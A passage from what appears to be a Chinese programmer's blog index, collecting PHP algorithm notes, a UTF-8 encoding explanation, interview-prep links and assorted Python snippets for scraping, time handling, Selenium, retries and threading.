输出打印http://blog.y0701.com/2018/09/18/PHP%E7%AE%97%E6%B3%95%E4%B9%8B%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E6%98%AF%E8%B4%A8%E6%95%B0/print_r($primeNumberArr); PHP算法之二分查找123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566/** * 二分查找算法 * @param array $arr 待查找区间 * @param int $number 查找数 * @return int 返回找到的键 */function binary_search($arr, $number) &#123; // 非数组或者数组为空，直接返回-1 if (!is_array($arr) || empty($arr)) &#123; return -1; &#125; // 初始变量值 $len = count($arr); $lower = 0; $high = $len - 1; // 最低点比最高点大就退出 while ($lower &lt;= $high) &#123; // 以中间点作为参照点比较 $middle = intval(($lower + $high) / 2); if ($arr[$middle] &gt; $number) &#123; // 查找数比参照点小，舍去右边 $high = $middle - 1; &#125; else if ($arr[$middle] &lt; $number) &#123; // 查找数比参照点大，舍去左边 $lower = $middle + 1; &#125; else &#123; // 查找数与参照点相等，则找到返回 return $middle; &#125; &#125; // 未找到，返回-1 return -1;&#125;/** * @param array $arr 待查找区间 * @param int $number 查找数 * @param int $lower 区间最低点 * @param int $high 区间最高点 * @return int */function binary_search_recursion(&amp;$arr, $number, $lower, $high) &#123; // 以区间的中间点作为参照点比较 $middle = intval(($lower + $high) / 2); // 最低点比最高点大就退出 if ($lower &gt; $high) &#123; return -1; &#125; if ($number &gt; $arr[$middle]) &#123; // 查找数比参照点大，舍去左边继续查找 return binary_search_recursion($arr, $number, $middle + 1, $high); &#125; elseif ($number &lt; $arr[$middle]) &#123; // 查找数比参照点小，舍去右边继续查找 return binary_search_recursion($arr, $number, $lower, $middle - 1); &#125; else &#123; return $middle; &#125;&#125;// 待查找区间$arr = [1, 3, 7, 9, 11, 57, 63, 99];// 非递归查找66所在的位置$find_key = binary_search($arr, 57);// 递归查找66所在的位置$find_key_r = binary_search_recursion($arr, 57, 0, count($arr));// 输出打印print_r($find_key);print_r($find_key_r);http://blog.y0701.com/2018/09/20/PHP%E7%AE%97%E6%B3%95%E4%B9%8B%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/ UTF-8编码1234567891011121314151617181920212223Unicode只是一个符号集，它只规定了符号的二进制代码，却没有规定这个二进制代码应该如何存储。汉字”严”的unicode是十六进制数4E25，转换成二进制数足足有15位（100111000100101），也就是说这个符号的表示至少需要2个字节。表示其他更大的符号，可能需要3个字节或者4个字节，甚至更多。UTF-8就是在互联网上使用最广的一种Unicode的实现方式。其他实现方式还包括UTF-16（字符用两个字节或四个字节表示）和UTF-32（字符用四个字节表示），不过在互联网上基本不用。重复一遍，这里的关系是，UTF-8是Unicode的实现方式之一。UTF-8最大的一个特点，就是它是一种变长的编码方式。它可以使用1~4个字节表示一个符号，根据不同的符号而变化字节长度。Unicode转义字符让我们可以通过Unicode码点输入特殊的字符。 有两种形式：\uhhhh对应16bit的码点值， \Uhhhhhhhh对应32bit的码点值， 其中h是一个十六进制数字；一般很少需要使用32bit的形式。 每一个对应码点的UTF8编码。 例如：下面的字母串面值都表示相同的值： "世界""\xe4\xb8\x96\xe7\x95\x8c""\u4e16\u754c""\U00004e16\U0000754c"上面三个转义序列都为第一个字符串提供替代写法， 但是它们的值都是相同的。打开”记事本”程序Notepad.exe，新建一个文本文件，内容就是一个”严”字，依次采用ANSI，Unicode，Unicode big endian 和 UTF-8编码方式保存。然后，用文本编辑软件UltraEdit中的”十六进制功能”，观察该文件的内部编码方式。ANSI：文件的编码就是两个字节”D1 CF”，这正是”严”的GB2312编码，这也暗示GB2312是采用大头方式存储的。Unicode：编码是四个字节”FF FE 25 4E”，其中”FF FE”表明是小头方式存储，真正的编码是4E25。Unicode big endian：编码是四个字节”FE FF 4E 25″，其中”FE FF”表明是大头方式存储。UTF-8：编码是六个字节”EF BB BF E4 B8 A5″，前三个字节”EF BB BF”表示这是UTF-8编码，后三个”E4B8A5″就是”严”的具体编码，它的存储顺序与编码顺序是一致的。注意，windows下通过记事本保存的utf8默认是带BOM的utf，而一般建议都是使用不带BOM的utf8编码https://xin053.github.io/2016/09/07/UTF-8%E7%BC%96%E7%A0%81/ 缓存穿透缓存击穿缓存雪崩123缓存穿透 ： DB 承受了没有必要的查询流量，意思就是查到空值的时候没有做缓存处理，再次查询的时候继续读库了缓存击穿：热点 Key，大量并发读请求引起的小雪崩， 就是缓存在某个时间点过期的时候，恰好在这个时间点对这个 Key 有大量的并发请求过来，这些请求发现缓存过期一般都会从后端 DB 加载数据并回设到缓存，这个时候大并发的请求可能会瞬间把后端 DB 压垮缓存雪崩：缓存设置同一过期时间，引发的大量的读取数据库操作 12 python 后端开发面经 看云文档 PHP 面试题和答案 程序员的自我修养 PHP 面试知识点汇总 正向代理为客户端做代理，反向代理为服务器做代理 计算机网络知识总结 排序算法全总结 面试中关于Redis的问题看这篇就够了 Mysql锁机制简单了解一下 消息队列其实很简单 一份最适合你的后端面试指南 面试必备之乐观锁与悲观锁 搞定计算机网络面试，看这篇就够了 程序员简历之道 前端&amp;后端程序员必备的Linux基础知识 技术人员成长必备！ 技术面试中常见的几道智力题 关于MySQL的知识点与面试常见问题都在这里 一份涵盖大部分Java程序员所需要掌握的核心知识 php面试 图标生成器 程序猿面试应知道的8种数据结构 历经 20 天，我终于完成了这份专为程序员编写的英语学习指南 如何”有计划，高效率，优简历”应对面试 小土刀的面试刷题笔记 我本以为你们会写简历 《数据结构与算法之美》复杂度分析 《软技能：代码之外的生存准则》读后感 Redis和mysql数据怎么保持数据一致的 Nginx高并发下的优化 笔试面试知识整理 PHPer 面试可能会遇到的问题 画江湖之算法篇【排序算法】冒泡排序 从零开始打造自己的PHP框架 Laravel 从入门到精通教程代码 Laravel 从入门到精通系列教程 程序员内功修炼系列 2019 版 PHP 面试的资料 简聊 Session 与 Token 身份验证 画江湖之数据结构【第二话:队列】队列 面试前必须要知道的 Redis 面试内容 【简易图解】『 OAuth2.0』 猴子都能懂的图解 面试之 Redis 基础、高级特性与性能调优 收集的干货，持续更新 PHP面试常考之设计模式——建造者模式 PHP 详细面试总结 (二 HTTP 请求全过程) lua 代理与反向代理、负载均衡和缓存 PHP-FPM 与 Nginx 的通信机制总结 从一道百度面试题说起 笔试面试常用排序算法总结 PHP 详细面试总结 面试的技巧（上）：听懂别人的问题 leetcode题解（数组问题） 如何准备算法面试 高并发下给数据库性能有哪些影响？ 大话后端开发的奇淫技巧大集合 聪明人应该如何背英语单词？ 20K+的高级PHP面试题汇总 阿里云Redis开发规范 php解决高并发问题 面试最让你手足无措的一个问题：你的系统如何支撑高并发 面试 (MySQL 索引为啥要选择 B+ 树) MySQL 避坑宝典 深入 Nginx 之配置篇 PHP 面试踩过的坑 PHP 面试详解之技术篇 PHP面试总结 记录开发或面试中可能遇到的知识点 程序员常见的编码和转义 当你在浏览器中输入“google.com”并回车，会发生什么 反向代理和内网穿透frp ngrok TCP 协议简单说明 最近去腾讯面试了，分享一波面试题 PHP面试准备的资料 2019年小米春季上海 PHP 实习生招聘面试题 2019年最新总结，阿里，腾讯，百度，美团，头条等技术面试题目 一些电子书pdf php面试 PHP 三年模拟五年面试之一网打尽系列（4）—– MySQL 高级 整理有关面试普遍问题和回答技巧 到底该学习什么编程语言 PHP7 底层运行机制]]></content>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python代码段收集]]></title>
    <url>%2F2019%2F02%2F26%2Fpython%E4%BB%A3%E7%A0%81%E6%AE%B5%E6%94%B6%E9%9B%86%2F</url>
    <content type="text"><![CDATA[5 行代码入门 Python 爬虫123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384import requestsimport pandas as pdfrom bs4 import BeautifulSoupfrom lxml import etreeimport timeimport pymysqlfrom sqlalchemy import create_enginefrom urllib.parse import urlencode # 编码 URL 字符串https://www.makcyun.top/web_scraping_withpython18.htmlstart_time = time.time() #计算程序运行时间def get_one_page(i): try: headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36' &#125; paras = &#123; 'reportTime': '2017-12-31', #可以改报告日期，比如2018-6-30获得的就是该季度的信息 'pageNum': i #页码 &#125; url = 'http://s.askci.com/stock/a/?' + urlencode(paras) response = requests.get(url,headers = headers) if response.status_code == 200: return response.text return None except RequestException: print('爬取失败')def parse_one_page(html): soup = BeautifulSoup(html,'lxml') content = soup.select('#myTable04')[0] #[0]将返回的list改为bs4类型 tbl = pd.read_html(content.prettify(),header = 0)[0] # prettify()优化代码,[0]从pd.read_html返回的list中提取出DataFrame tbl.rename(columns = &#123;'序号':'serial_number', '股票代码':'stock_code', '股票简称':'stock_abbre', '公司名称':'company_name', '省份':'province', '城市':'city', '主营业务收入(201712)':'main_bussiness_income', '净利润(201712)':'net_profit', '员工人数':'employees', '上市日期':'listing_date', '招股书':'zhaogushu', '公司财报':'financial_report', '行业分类':'industry_classification', '产品类型':'industry_type', '主营业务':'main_business'&#125;,inplace = True) return tbldef generate_mysql(): conn = pymysql.connect( host='localhost', user='root', password='******', port=3306, charset = 'utf8', db = 'wade') cursor = conn.cursor() sql = 'CREATE TABLE IF NOT EXISTS listed_company (serial_number INT(20) NOT NULL,stock_code INT(20) ,stock_abbre VARCHAR(20) ,company_name VARCHAR(20) ,province VARCHAR(20) ,city VARCHAR(20) ,main_bussiness_income VARCHAR(20) ,net_profit VARCHAR(20) ,employees INT(20) ,listing_date DATETIME(0) ,zhaogushu VARCHAR(20) ,financial_report VARCHAR(20) , industry_classification VARCHAR(20) ,industry_type VARCHAR(100) ,main_business VARCHAR(200) ,PRIMARY KEY (serial_number))' cursor.execute(sql) conn.close() def write_to_sql(tbl, db = 'wade'): engine = create_engine('mysql+pymysql://root:******@localhost:3306/&#123;0&#125;?charset=utf8'.format(db)) try: tbl.to_sql('listed_company2',con = engine,if_exists='append',index=False) # append表示在原有表基础上增加，但该表要有表头 except Exception as e: print(e)def main(page): generate_mysql() for i in range(1,page): html = get_one_page(i) tbl = parse_one_page(html) write_to_sql(tbl) # # 单进程if __name__ == '__main__': main(178) endtime = time.time()-start_time print('程序运行了%.2f秒' %endtime) # 多进程from multiprocessing import Poolif __name__ == '__main__': pool = Pool(4) pool.map(main, [i for i in range(1,178)]) #共有178页 endtime = time.time()-start_time print('程序运行了%.2f秒' %(time.time()-start_time)) import pandas as pdimport csvfor i in range(1,178): # 爬取全部页 tb = pd.read_html('http://s.askci.com/stock/a/?reportTime=2017-12-31&amp;pageNum=%s' % (str(i)))[3] tb.to_csv(r'1.csv', mode='a', encoding='utf_8_sig', header=1, index=0) 时间处理123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103# -*- coding: utf-8 -*-# author: inpurer(月小水长)# pc_type lenovo# create_date: 2018/12/3# file_name: timetest.py# description: 月小水长，热血未凉import timet0 = time.time()#description: 输出当前时间距离1970.1.1的秒数,精确到小数点后6位，也叫做时间戳#output sample: 1543799532.602318print(t0)t1 = time.localtime(t0)#description: 把时间戳转成元组,包含七个元素,前六个见名知意,tm_wday是指今天是当前周的第几天(index from 0),tm_yday类似,tm_isdst是否是夏令时,不用关心#output sample: time.struct_time(tm_year=2018, tm_mon=12, tm_mday=3, tm_hour=9, tm_min=22, tm_sec=24, tm_wday=0, tm_yday=337, tm_isdst=0)print(t1)#so,可以这样输出今天是今年的第多少天print(t1[-2]+1)#下面是对该元组的格式化#description: 简单可读形式#output sample: Mon Dec 3 09:31:18 2018t2 = time.asctime(t1)print(t2)#description: 可通过参数设置成各种形式，下面是一种标准形式,各参数见名知意#output sample: 2018-12-03 09:33:36t3 = time.strftime("%Y-%m-%d %H:%M:%S", t1)print(t3)#%y 两位数的年份表示（00-99）# %Y 四位数的年份表示（000-9999）# %m 月份（01-12）# %d 月内中的一天（0-31）# %H 24小时制小时数（0-23）# %I 12小时制小时数（01-12）# %M 分钟数（00=59）# %S 秒（00-59）## %a 本地简化星期名称# %A 本地完整星期名称# %b 本地简化的月份名称# %B 本地完整的月份名称# %c 本地相应的日期表示和时间表示# %j 年内的一天（001-366）# %p 本地A.M.或P.M.的等价符# %U 一年中的星期数（00-53）星期天为星期的开始# %w 星期（0-6），星期天为星期的开始# %W 一年中的星期数（00-53）星期一为星期的开始# %x 本地相应的日期表示# %X 本地相应的时间表示# %Z 当前时区的名称# %% %号本身# 下面是把格式化字符串转成元组# description: 第一个参数个格式化后的字符串,后一个参数和格式化对应，便于反格式化# output sample: time.struct_time(tm_year=2018, tm_mon=12, tm_mday=3, tm_hour=9, tm_min=47, tm_sec=7, tm_wday=0, tm_yday=337, tm_isdst=-1)t4 = time.strptime(t3,'%Y-%m-%d %H:%M:%S')print(t4)# 把元组转成时间戳#description: 是time.localtime的反函数,不过由于格式化的原因，精度有所下降#output sample: 1543801627.0t5 = time.mktime(t4)print(t5)# -*- coding: utf-8 -*-# author: inpurer(月小水长)# pc_type lenovo# create_date: 2018/12/3# file_name: timetest.py# description: 月小水长，热血未凉import datetime#通过datetime.datetime.now()可以获得当前日期时间的一个实例#这个实例是一个datetime类对象而不是字符串#虽然直接打印该实例输出的是一个字符串,只是调用datetime实现的__str__方法而已t0 = datetime.datetime.now()print(t0) #print: 2018-12-03 12:55:49.905971print(type(t0)) #print: &lt;class 'datetime.datetime'&gt;#然后就可以通过对象名.的方法输出各个时间信息,该信息是一个int类型print(t0.year) #print: 2018print(type(t0.year)) #print: &lt;class 'int'&gt;print(t0.month)print(t0.day)print(t0.hour)print(t0.minute)print(t0.second)import datetimet0 = datetime.datetime.now()#注意year/month/day都是int类型，不像java那样可以直接拼接字符串和数字wanted_time = str(t0.year)+"-"+str(t0.month)+"-"+str(t0.day)#https://inspurer.github.io/2018/12/03/%E4%B8%80%E6%96%87%E6%90%9E%E5%AE%9Apython%E7%9A%84%E6%97%B6%E9%97%B4%E5%A4%84%E7%90%86/import timet0 = time.localtime()wanted_time = time.strftime("%Y-%m-%d",t0) error: Microsoft Visual C++ 14.0 is required123456789源码安装，但是没有 C++ 的编译环境 error: Microsoft Visual C++ 14.0 is required. Get it with "Microsoft VisualC++ Build Tools": http://landinghub.visualstudio.com/visual-cpp-build-tools如果是 Python 27 可以安装 Microsoft Visual C++ Compiler for Python 2.7 https://www.microsoft.com/en-us/download/details.aspx?id=44266如果是 Python 3 可以安装 Visual C++ 2015 Build Tools http://landinghub.visualstudio.com/visual-cpp-build-tools或者使用下载编译好的 exe 文件或者使用 whl 格式的包 逗号引发的悲剧1234567891011121314151617181920212223242526&gt;&gt;&gt; a = [... 'foo'... 'bar',... 'tree'... ]&gt;&gt;&gt;&gt;&gt;&gt; b = 'foo' 'bar'&gt;&gt;&gt;&gt;&gt;&gt; print a['foobar', 'tree']&gt;&gt;&gt; print bfoobar&gt;&gt;&gt;也就是说 'foo' + 'bar' 等价于 'foo' 'bar'再来看另外一个例子，注意第二行后面的逗号 &gt;&gt;&gt; a = &#123;'foo': 'bar'&#125;&gt;&gt;&gt; b = a.get('foo'),&gt;&gt;&gt; c = a.get('foo')&gt;&gt;&gt; print(b)('bar',)&gt;&gt;&gt; print(c)bar&gt;&gt;&gt;本来 b 应该是一个字符串，结果硬是变成了元组。https://www.restran.net/2015/11/07/python-comma-issue/ Python获取Bing图片做壁纸12345678910111213141516171819202122232425262728http://jeffyang.top/Python/python%E8%8E%B7%E5%8F%96Bing%E5%9B%BE%E7%89%87%E5%81%9A%E5%A3%81%E7%BA%B8/def get_url(day=0): url = "https://www.bing.com/HPImageArchive.aspx?format=js&amp;idx=" + str(day) + "&amp;n=1&amp;nc=1509675905008&amp;pid=hp&amp;video=1" return urldef get_img(url, path="D://wallpaper/"): isExists = os.path.exists(path)#https://github.com/JianFengY/BingSpider if not isExists: os.makedirs(path) html = requests.get(url) content = html.json() src = "https://www.bing.com" + content['images'][0]['url'] urlretrieve(src, path + content['images'][0]['enddate'] + '.jpg')def set_wallpaper_from_bmp(bmp_path): reg_key = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER, "Control Panel\\Desktop", 0, win32con.KEY_SET_VALUE) win32api.RegSetValueEx(reg_key, "WallpaperStyle", 0, win32con.REG_SZ, "2") win32api.RegSetValueEx(reg_key, "TileWallpaper", 0, win32con.REG_SZ, "0") win32gui.SystemParametersInfo(win32con.SPI_SETDESKWALLPAPER, bmp_path, win32con.SPIF_SENDWININICHANGE) def set_wallpaper(img_path): isExists = os.path.exists(img_path) if isExists: img_dir = os.path.dirname(img_path) bmpImage = Image.open(img_path) new_bmp_path = os.path.join(img_dir, 'wallpaper.bmp') bmpImage.save(new_bmp_path, "BMP") set_wallpaper_from_bmp(new_bmp_path) return True else: return False 自动化测试工具from selenium import webdriver123456789101112131415161718192021222324252627282930313233343536373839404142 from selenium.webdriver.common.by import By from selenium.webdriver.common.keys import Keys from selenium.webdriver.support import expected_conditions as EC from selenium.webdriver.support.wait import WebDriverWait browser = webdriver.Chrome() try: browser.get('https://www.baidu.com') input = browser.find_element_by_id('kw') input.send_keys('Python') input.send_keys(Keys.ENTER) wait = WebDriverWait(browser, 10) wait.until(EC.presence_of_element_located((By.ID, 'content_left'))) print(browser.current_url) print(browser.get_cookies()) print(browser.page_source) finally: browser.close()browser = webdriver.Chrome()browser.get('https://www.zhihu.com/explore')browser.execute_script('window.scrollTo(0, document.body.scrollHeight)')browser.execute_script('alert("To Bottom")')browser = webdriver.Chrome()browser.implicitly_wait(10)browser.get('https://www.zhihu.com/explore')input = browser.find_element_by_class_name('zu-top-add-question')print(input)try: browser.get('https://www.baidu.com')except TimeoutException: print('Time Out')try: browser.find_element_by_id('hello')except NoSuchElementException: print('No Element')finally: browser.close() http://jeffyang.top/Python/%E7%88%AC%E8%99%AB/Python%E7%88%AC%E8%99%AB%E5%B8%B8%E7%94%A8%E5%BA%93selenium%E8%AF%A6%E8%A7%A3/ 取交集，并集和差集123456789101112131415161718a = ['a','b','c']，b = ['b','c','d']交集:print list(set(a).intersection(set(b)))#或者isec = [val for val in a if val in b]print isec并集print list(set(a).union(set(b)))差集print list(set(b).difference(set(a))) # b-aa = [[1,2],[3,4],[1,4]]b = [x for j in a for x in j]print b[1, 2, 3, 4, 1, 4] list分割成固定长度子list12345678def splite_list(splist, s): """splite a list to sub list contain s""" return [splist[i:i + s] for i in range(len(splist)) if i % s == 0]#testlist1 = range(10)splite_list(list1,2)[[0, 1], [2, 3], [4, 5], [6, 7], [8, 9]] 生成英文字母表12345678910111213小写字母表list(map(chr,list(range(97, 123))))大写字母list(map(chr,list(range(65, 91))))小写字母表import stringstring.ascii_uppercase大写字母import stringstring.ascii_lowercase 字典排序1234567891011121314151617按键排序dic = &#123;'a':11 , 'b':5 , 'c': 7&#125;# 升序排序sorted(dic.keys())# 降序排序sorted(dic.keys(), reverse=True)按值排序dic = &#123;'a':11 , 'b':5 , 'c': 7&#125;# 升序sorted(dic.items(), key = lambda x:x[1])# 降序sorted(dic.items(), key = lambda x:x[1],reverse =True) 微信公众号或网页自动导出12345678910111213141516171819https://juejin.im/post/5b4cc601f265da0f5a2545a9https://github.com/MartinHan01/webpage2imgpip install pillowinit_filelist() #首先初始化webdirver driver = webdriver.Chrome() #设置输出路径 dir = './result' for item in filelist: try: #获取图片路径，标题，以及输出路径 #自动滚动，并截图保存 pic_path,title = save_url(driver, item, dir) #开始合并我们刚刚截的所有图 package_picture(pic_path, os.path.abspath(dir), title) except Exception as e : print(e)python crop.py 批量压缩图片12345678910111213pip install --upgrade tinifyimport tinifyimport ostinify.key = '此处填入你的key'path = "xxx" # 图片存放的路径for dirpath, dirs, files in os.walk(path): for file in files: imgpath = os.path.join(dirpath, file) print("compressing ..."+ imgpath) tinify.from_file(imgpath).to_file(imgpath) 重试123456789101112131415161718192021222324252627282930313233343536373839404142434445import randomfrom tenacity import retry@retrydef do_something_unreliable(): if random.randint(0, 10) &gt; 1: raise IOError("Broken sauce, everything is hosed!!!111one") else: return "Awesome sauce!"print(do_something_unreliable())from tenacity import *@retry(stop=(stop_after_delay(10) | stop_after_attempt(5)), wait=wait_fixed(2))def stop_after_10_s_or_5_retries(): print("Stopping after 10 seconds or 5 retries") raise Exception 重试5次，每次间隔10秒，重试前等待2秒 def func(): pass for _ in range(0,100): while True: try: func() except SomeSpecificException: continue break def verify_url(url): import requests try: requests.get(url, timeout=10) return True except requests.exceptions.ConnectTimeout: return False def main(): for _ in range(5): try: if verify_url(''): return else: continue except KeyError: continue if __name__ == '__main__': main() https://zhangslob.github.io/2019/01/14/Python%E9%87%8D%E8%AF%95%E7%9A%84%E5%A4%9A%E9%87%8D%E6%96%B9%E6%B3%95/ 登录GitHub12345678910111213141516171819202122232425262728293031323334353637#!/usr/bin/env python# -*- coding: utf-8 -*-import reimport requestsheaders = &#123; 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8', 'Connection': 'keep-alive', 'Host': 'github.com', 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36'&#125;s = requests.session()s.headers.update(headers)def get_token(): url = 'https://github.com/login' response = s.get(url) pat = 'name=\"authenticity_token\" value=\"(.*?)\"' authenticity_token = re.findall(pat, response.text)[0] return authenticity_tokendef login(authenticity_token, account, password): payload = &#123; 'commit': 'Sign in', 'utf8': '\u2713', 'authenticity_token': authenticity_token, 'login': account, 'password': password, &#125; url = 'https://github.com/session' response = s.post(url, data=payload) print(response) # do whatever you wantif __name__ == '__main__': account, password = 'account', 'password' authenticity_token = get_token() login(authenticity_token, account, password) 多线程和多进程1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import concurrent.futuresimport urllib.requestURLS = ['http://www.foxnews.com/', 'http://www.cnn.com/', 'http://europe.wsj.com/', 'http://www.bbc.co.uk/', 'http://some-made-up-domain.com/']# Retrieve a single page and report the URL and contentsdef load_url(url, timeout): with urllib.request.urlopen(url, timeout=timeout) as conn: return conn.read()# We can use a with statement to ensure threads are cleaned up promptlywith concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor: # Start the load operations and mark each future with its URL future_to_url = &#123;executor.submit(load_url, url, 60): url for url in URLS&#125; for future in concurrent.futures.as_completed(future_to_url): url = future_to_url[future] try: data = future.result() except Exception as exc: print('%r generated an exception: %s' % (url, exc)) else: print('%r page is %d bytes' % (url, len(data))) import concurrent.futures import math PRIMES = [ 112272535095293, 112582705942171, 112272535095293, 115280095190773, 115797848077099, 1099726899285419] def is_prime(n): if n % 2 == 0: return False sqrt_n = int(math.floor(math.sqrt(n))) for i in range(3, sqrt_n + 1, 2): if n % i == 0: return False return True def main(): with concurrent.futures.ProcessPoolExecutor() as executor: for number, prime in zip(PRIMES, executor.map(is_prime, PRIMES)): print('%d is prime: %s' % (number, prime)) if __name__ == '__main__': main() https://zhangslob.github.io/2018/07/03/%E5%BF%AB%E9%80%9F%E5%86%99%E4%B8%80%E4%B8%AA%E7%88%AC%E8%99%AB/ Pandas 做数据分析12345678910111213141516171819import pandas as pdimport numpy as npurl = ('https://raw.github.com/pandas-dev/pandas/master/pandas/tests/data/tips.csv')tips = pd.read_csv(url)output = tips.head()&gt;&gt;&gt; output total_bill tip sex smoker day time size0 16.99 1.01 Female No Sun Dinner 21 10.34 1.66 Male No Sun Dinner 32 21.01 3.50 Male No Sun Dinner 33 23.68 3.31 Male No Sun Dinner 24 24.59 3.61 Female No Sun Dinner 4sql 语句： SELECT total_bill, tip, smoker, time FROM tips LIMIT 5;。output = tips[['total_bill', 'tip', 'smoker', 'time']].head(5)https://learnku.com/articles/29825 多线程12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576线程 (Thread) 是操作系统能够进行运算调度的最小单位。它被包含在进程中，是进程中的实际运作单位。一个进程中可以并发多个线程，每条线程并行执行不同的任务。同一进程中的多个线程共享进程中的全部系统资源。以下演示使用多线程对一个变量值进行修改，在循环的次数不多时修改后变量的值是符合预期的，当增加循环次数后，变量最终的值并不符合预期。由此可见：线程之间资源是存在竞争的，修改同一份资源必须加互斥锁，同时需要避免死锁。# coding=utf-8import threading# 定义一个字段。多线程执行+1操作balance = 0def worker1(): global balance for i in range(1000): balance += 1 print('线程1执行完成，balance='+str(balance))def worker2(): global balance for i in range(1000): balance += 1 print('线程2执行完成，balance='+str(balance))def main(): # 构造线程对象 t1 = threading.Thread(target=worker1) t2 = threading.Thread(target=worker2) # 开始执行 t1.start() t2.start() """ 循环次数为1000时，程序输出： 线程1执行完成，balance=1000 线程2执行完成，balance=2000 循环次数为1000000时，程序输出： 线程1执行完成，balance=1180919 线程2执行完成，balance=1179703 """ if __name__ == '__main__': main()要想解决以下的问题，需要使用线程的锁对象，只需要对 worker1 和 woker2 方法进行修改。# 创建一个互斥锁，默认是未锁定状态mutex = threading.Lock()def worker1(): global balance for i in range(1000000): mutex.acquire() balance += 1 mutex.release() print('线程1执行完成，balance=' + str(balance))def worker2(): global balance for i in range(1000000): mutex.acquire() balance += 1 mutex.release() print('线程2执行完成，balance=' + str(balance))"""加了互斥锁之后的输出： 线程1执行完成，balance=1941343 线程2执行完成，balance=2000000"""特点：线程执行的顺序是不确定的主线程【进程】会等待所有子线程结束后才会退出，主线程【进程】结束么子线程必然结束线程间共享资源修改资源必要时需要加锁，同时避免死锁占用的资源比进程少线程并不是越多越快由于 GIL 的原因，多线程并不是真正的并发，只是交替执行https://learnku.com/articles/29367 尾递归1234567891011121314# 例子代码def tail_recursion(n, total=0): if n == 0: return total else: return tail_recursion(n-1, total+n)# 执行结果：tail_recursion(5)tail_recursion(4, 5)tail_recursion(3, 9)tail_recursion(2, 12)tail_recursion(1, 14)tail_recursion(0, 15)5+4+3+2+1=15 获取公众号全部文章1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283https://mp.weixin.qq.com/s/nkW2sYLcdsNTYTkk-4BeLAimport requestsimport jsonimport timefrom pymongo import MongoClienturl = 'http://mp.weixin.qq.com/mp/xxx'（公众号不让添加主页链接，xxx表示profile_ext)#url='https://mp.weixin.qq.com/mp/profile_ext?action=getmsg&amp;__biz=MzIyMjg2ODExMA==&amp;f=json&amp;offset=21&amp;count=10&amp;is_ok=1&amp;scene=124&amp;uin=NjQ3OTQwMTAy&amp;key=a90c16d3bbfeedd04adeeda7bfc81049f486e81712f95a347e33fccfb9fe00841ec6a4d0984ce32f72fe5e8c479fd13c6680b5496cda322ab1bb2b81417a10ae277a861ad580e77cdf78edbf86212c08&amp;pass_ticket=2vonvdf3N4L67te2BCa4ZqvIs1ed2MoeBqoznvfNSL%2BeKqF4YgHUvNEWLNczZovz&amp;wxtoken=&amp;appmsg_token=1015_jLHC7BDStvidMqo9YO55XLerjoP9z6UM70Q5vw~~&amp;x5=0&amp;f=json'# Mongo配置conn = MongoClient('127.0.0.1', 27017)db = conn.wx #连接wx数据库，没有则自动创建mongo_wx = db.article #使用article集合，没有则自动创建def get_wx_article(biz, uin, key, index=0, count=10): offset = (index + 1) * count params = &#123; '__biz': biz, 'uin': uin, 'key': key, 'offset': offset, 'count': count, 'action': 'getmsg', 'f': 'json' &#125; headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36' &#125; response = requests.get(url=url, params=params, headers=headers) resp_json = response.json() if resp_json.get('errmsg') == 'ok': resp_json = response.json() # 是否还有分页数据， 用于判断return的值 can_msg_continue = resp_json['can_msg_continue'] # 当前分页文章数 msg_count = resp_json['msg_count'] general_msg_list = json.loads(resp_json['general_msg_list']) list = general_msg_list.get('list') print(list, "**************") for i in list: app_msg_ext_info = i['app_msg_ext_info'] # 标题 title = app_msg_ext_info['title'] # 文章地址 content_url = app_msg_ext_info['content_url'] # 封面图 cover = app_msg_ext_info['cover'] # 发布时间 datetime = i['comm_msg_info']['datetime'] datetime = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(datetime)) mongo_wx.insert(&#123; 'title': title, 'content_url': content_url, 'cover': cover, 'datetime': datetime &#125;) if can_msg_continue == 1: return True return False else: print('获取文章异常...') return Falseif __name__ == '__main__': biz = 'Mzg4MTA2Nzg0NA==' uin = 'NDIyMTI5NDM1' key = '20a680e825f03f1e7f38f326772e54e7dc0fd02ffba17e92730ba3f0a0329c5ed310b0bd55b3c0b1f122e5896c6261df2eaea4036ab5a5d32dbdbcb0a638f5f3605cf1821decf486bb6eb4d92d36c620' index = 0 while 1: print(f'开始抓取公众号第&#123;index + 1&#125; 页文章.') flag = get_wx_article(biz, uin, key, index=index) # 防止和谐，暂停8秒 time.sleep(8) index += 1 if not flag: print('公众号文章已全部抓取完毕，退出程序.') break print(f'..........准备抓取公众号第&#123;index + 1&#125; 页文章.') PHP 与 Python 代码对比123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051# -*- coding: utf-8 -*-n = 0https://learnku.com/articles/30958while n &lt; 3: #累计次数,用于循环条件 n = n + 1 #定义账号和密码 uname = 'tangqingsong' pwd = '123123' #接收参数 username = input('请输入用户名:') password = input('请输入密码:') #判断用户输入的账号和密码是否正确，正确将提示成功，并且退出循环体 if uname == username and pwd == password: print ('恭喜你，登陆成功~') break #三次机会用完的时候,提示错误次数，并告知即将退出 elif n == 3: print('已错误', n, '次，即将退出...') #如果在三次以内,提示还剩下几次机会 else: 